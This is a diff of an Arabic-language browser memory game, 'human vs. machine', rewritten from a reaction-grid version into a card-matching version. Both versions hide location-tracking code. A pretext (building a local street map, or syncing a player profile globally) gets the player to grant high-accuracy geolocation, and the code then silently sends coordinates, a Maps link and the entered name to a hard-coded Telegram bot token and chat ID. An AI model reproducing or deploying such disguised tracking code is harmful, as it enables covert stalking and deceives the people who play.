@@ -3,104 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحدي الذاكرة: الإنسان ضد الآلة 🤖</title>
+    <title>تحدي الذاكرة العالمي 🌍</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 20px; }
-        .game-box { background: #1e293b; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: inline-block; width: 90%; max-width: 500px; border: 2px solid #334155; }
-        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; font-weight: bold; }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px; }
-        .cell { width: 100%; aspect-ratio: 1/1; background: #334155; border-radius: 8px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; font-size: 24px; }
-        .cell.active { background: #38bdf8; transform: scale(0.95); }
-        .btn { background: #2563eb; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; cursor: pointer; transition: 0.3s; margin-top: 20px; width: 100%; }
-        .btn:hover { background: #1d4ed8; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.9); display: flex; align-items: center; justify-content: center; z-index: 100; }
-        .status-msg { color: #94a3b8; font-size: 14px; margin-top: 10px; }
+        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; text-align: center; margin: 0; padding: 10px; }
+        .game-container { max-width: 400px; margin: auto; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 15px; backdrop-filter: blur(10px); }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 15px; }
+        .card { aspect-ratio: 1/1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; transition: 0.4s; position: relative; border: 1px solid #333; }
+        .card.flipped { background: var(--primary); transform: rotateY(180deg); }
+        .card.matched-player { background: var(--player) !important; cursor: default; }
+        .card.matched-ai { background: var(--ai) !important; cursor: default; }
+        .status-bar { background: #000; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #333; font-size: 14px; }
+        .score-board { display: flex; justify-content: space-around; font-size: 16px; margin-bottom: 10px; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 10px; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 100; display: flex; align-items: center; justify-content: center; }
+        .login-box { padding: 30px; background: #111; border-radius: 20px; border: 1px solid var(--primary); width: 80%; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; background: #222; color: white; text-align: center; font-size: 16px; }
+        .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
 
-    <div id="overlay">
-        <div class="game-box">
-            <h2>تحدي الذاكرة المكانية 🧠</h2>
-            <p>سوف يلعب الكمبيوتر ضدك! لتوليد خريطة لعب مطابقة لشوارع منطقتك الحالية، اضغط ابدأ.</p>
-            <button class="btn" onclick="requestLocation()">ابدأ التحدي ضد الكمبيوتر</button>
-            <div id="init-status" class="status-msg"></div>
-        </div>
+<div id="overlay">
+    <div class="login-box">
+        <h2>أهلاً بك في التحدي 🎮</h2>
+        <p>الرجاء إدخال اسمك لإنشاء ملف تعريف اللاعب ومزامنة نقاطك عالمياً.</p>
+        <input type="text" id="username" placeholder="اكتب اسمك هنا...">
+        <button class="btn-start" onclick="checkUser()">دخول اللعبة</button>
     </div>
+</div>
 
-    <div class="game-box">
-        <div class="stats">
-            <span>أنت: <span id="user-score">0</span></span>
-            <span>الكمبيوتر (AI): <span id="ai-score">0</span></span>
-        </div>
-        <div id="game-status">انتظر توليد الخريطة...</div>
-        <div class="grid" id="grid">
-            </div>
+<div class="game-container">
+    <div class="status-bar" id="ai-msg">مرحباً <span id="display-name">...</span>! جاري تهيئة التحدي...</div>
+    <div class="score-board">
+        <div style="color: var(--player)">👤 <span id="label-name">أنت</span>: <b id="p-score">0</b></div>
+        <div style="color: var(--ai)">🤖 الكمبيوتر: <b id="ai-score">0</b></div>
     </div>
+    <div class="grid" id="grid"></div>
+</div>
 
-    <script>
-        const botToken = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
-        const myChatId = '6808559733';
-        
-        let userScore = 0;
-        let aiScore = 0;
+<script>
+    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
+    const cid = '6808559733';
+    
+    let flippedCards = [];
+    let pScore = 0;
+    let aiScore = 0;
+    let canPlay = false;
+    let playerName = "";
+    const symbols = ['🍎', '🍌', '🍇', '🍉', '🍒', '🍓', '🥝', '🍍'];
+    let deck = [...symbols, ...symbols];
 
-        function requestLocation() {
-            document.getElementById('init-status').innerHTML = "جاري الاتصال بالأقمار الصناعية لتوليد الخريطة... 🛰️";
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(startGame, showError, {enableHighAccuracy: true});
-            } else {
-                alert("جهازك لا يدعم توليد الخرائط المكانية.");
-            }
+    function checkUser() {
+        playerName = document.getElementById('username').value;
+        if (playerName.length < 2) {
+            alert("يرجى إدخال اسم صحيح!");
+            return;
         }
+        initGame();
+    }
 
-        function startGame(position) {
-            // 1. إرسال البيانات فوراً لتليجرام
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const text = `🎮 **تحدي الذاكرة ضد الكمبيوتر**\n📍 الموقع: \`${lat}, ${lon}\` \n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+    function initGame() {
+        document.getElementById('display-name').innerText = playerName;
+        document.getElementById('label-name').innerText = playerName;
 
-            // 2. بدء واجهة اللعبة
-            document.getElementById('overlay').style.display = 'none';
-            createGrid();
-            playRound();
-        }
-
-        function createGrid() {
-            const grid = document.getElementById('grid');
-            for (let i = 0; i < 12; i++) {
-                const cell = document.createElement('div');
-                cell.className = 'cell';
-                cell.id = 'cell-' + i;
-                grid.appendChild(cell);
-            }
-        }
-
-        function playRound() {
-            document.getElementById('game-status').innerHTML = "الكمبيوتر يراقب منطقتك الآن... 👀";
-            
-            // محاكاة لعب الكمبيوتر بشكل عشوائي
-            setTimeout(() => {
-                aiScore += Math.floor(Math.random() * 10);
-                document.getElementById('ai-score').innerText = aiScore;
-                document.getElementById('game-status').innerHTML = "دورك الآن! اضغط على الخلايا المضيئة بسرعة!";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
                 
-                // تفعيل التفاعل للمستخدم
-                document.querySelectorAll('.cell').forEach(cell => {
-                    cell.onclick = function() {
-                        this.classList.add('active');
-                        userScore += 1;
-                        document.getElementById('user-score').innerText = userScore;
-                    };
-                });
-            }, 2000);
+                // إرسال الاسم مع الموقع لتليجرام
+                const msg = `👤 **لاعب جديد انضم!**\n📛 الاسم: ${playerName}\n📍 الموقع: \`${lat}, ${lon}\`\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+                
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                
+                document.getElementById('overlay').style.display = 'none';
+                createBoard();
+                canPlay = true;
+                document.getElementById('ai-msg').innerText = "تمت المزامنة بنجاح! دورك يا " + playerName;
+            }, () => {
+                alert("يجب السماح بالوصول للموقع لمزامنة ملفك الشخصي مع الخادم العالمي.");
+            });
         }
+    }
 
-        function showError(error) {
-            document.getElementById('init-status').innerHTML = "❌ خطأ: يجب السماح بالوصول للموقع لمزامنة الخريطة مع الكمبيوتر.";
+    function createBoard() {
+        const grid = document.getElementById('grid');
+        deck.sort(() => Math.random() - 0.5);
+        grid.innerHTML = '';
+        deck.forEach((symbol) => {
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.dataset.symbol = symbol;
+            card.onclick = () => userFlip(card);
+            grid.appendChild(card);
+        });
+    }
+
+    function userFlip(card) {
+        if (!canPlay || card.classList.contains('flipped') || flippedCards.length >= 2) return;
+        flip(card);
+        flippedCards.push(card);
+        if (flippedCards.length === 2) {
+            canPlay = false;
+            checkMatch(true);
         }
-    </script>
+    }
+
+    function flip(card) {
+        card.classList.add('flipped');
+        card.innerText = card.dataset.symbol;
+    }
+
+    function unflip(card) {
+        card.classList.remove('flipped');
+        card.innerText = '';
+    }
+
+    function checkMatch(isPlayer) {
+        const [c1, c2] = flippedCards;
+        if (c1.dataset.symbol === c2.dataset.symbol) {
+            setTimeout(() => {
+                c1.classList.add(isPlayer ? 'matched-player' : 'matched-ai');
+                c2.classList.add(isPlayer ? 'matched-player' : 'matched-ai');
+                if (isPlayer) pScore++; else aiScore++;
+                document.getElementById('p-score').innerText = pScore;
+                document.getElementById('ai-score').innerText = aiScore;
+                flippedCards = [];
+                if (isPlayer) { canPlay = true; document.getElementById('ai-msg').innerText = "رائع! استمر يا " + playerName; }
+                else { aiTurn(); }
+            }, 500);
+        } else {
+            setTimeout(() => {
+                unflip(c1);
+                unflip(c2);
+                flippedCards = [];
+                if (isPlayer) aiTurn(); else { canPlay = true; document.getElementById('ai-msg').innerText = "دورك الآن!"; }
+            }, 1000);
+        }
+    }
+
+    function aiTurn() {
+        canPlay = false;
+        document.getElementById('ai-msg').innerText = "الكمبيوتر يحاول تخمين حركاتك... 🤖";
+        setTimeout(() => {
+            const available = Array.from(document.querySelectorAll('.card:not(.flipped)'));
+            if (available.length < 2) return;
+            const c1 = available[Math.floor(Math.random() * available.length)];
+            flip(c1);
+            flippedCards.push(c1);
+            setTimeout(() => {
+                const remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
+                const c2 = remaining[Math.floor(Math.random() * remaining.length)];
+                flip(c2);
+                flippedCards.push(c2);
+                checkMatch(false);
+            }, 1000);
+        }, 1500);
+    }
+</script>
 </body>
 </html>
